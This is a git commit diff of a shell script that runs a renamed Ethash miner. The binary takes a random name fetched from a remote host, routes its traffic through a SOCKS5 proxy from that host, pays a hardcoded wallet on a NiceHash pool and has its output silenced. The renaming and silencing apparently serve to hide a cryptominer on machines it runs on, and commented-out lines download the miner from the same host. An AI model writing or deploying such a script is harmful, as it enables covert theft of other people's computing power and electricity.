4b2849f689cc7062b5111d38611e635a3c12b421
anon1jju <104222912+anon1jju@users.noreply.github.com>
2022-05-21 10:23:52 +0700

    Update khem.sh

--- khem.sh
+++ khem.sh
@@ -1,12 +1,11 @@
-#!/bin/sh
+#!/bin/bash
+#wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-#wget https://cuan.mine.nu/lol/bubu && chmod +x bubu
-chmod +x bubu
-mv bubu $ACAK
+chmod +x bubu && mv bubu $ACAK
 WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
-POOL=daggerhashimoto.auto.nicehash.com:9200
+POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti.php))
 WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --pool $POOL --socks5 $PROXY --user $WALLET.$WORKER1
+./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
